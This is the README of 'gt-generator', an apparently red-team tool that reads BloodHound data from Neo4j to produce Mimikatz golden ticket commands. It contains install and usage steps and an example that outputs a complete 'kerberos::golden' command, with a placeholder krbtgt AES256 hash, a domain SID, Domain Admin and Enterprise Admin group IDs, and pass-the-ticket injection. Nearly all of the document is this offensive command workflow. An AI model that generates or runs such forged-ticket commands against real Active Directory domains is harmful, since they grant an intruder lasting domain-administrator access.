# gt-generator

Use BloodHound data to generate golden ticket commands without having to do all of those SID lookups!

##### Warning

This currently does not take into account foreign group memberships.

## Usage

```bash
$ python3 -m venv venv
$ . venv/bin/activate
$ pip install -r requirements.txt
$ python gt-generator.py -s <NEO4J_SERVER> -u <NEO4J_USERNAME> -p <NEO4J_PASSWORD> <FQDN> <USERNAME> <KRBTGT_AES256_HASH>
```

#### Example
```bash
$ python gt-generator.py -s 127.0.0.1:7474 -u neo4j -p neo4j testlab.local administrator 1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff

mimikatz kerberos::golden /user:ADMINISTRATOR /aes256:1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff /domain:TESTLAB.LOCAL /sid:S-1-5-21-1111111111-222222222-3333333333 /groups:513,512,518,519,520 /id:500 /endin:480 /renewmax:10080 /ptt
```
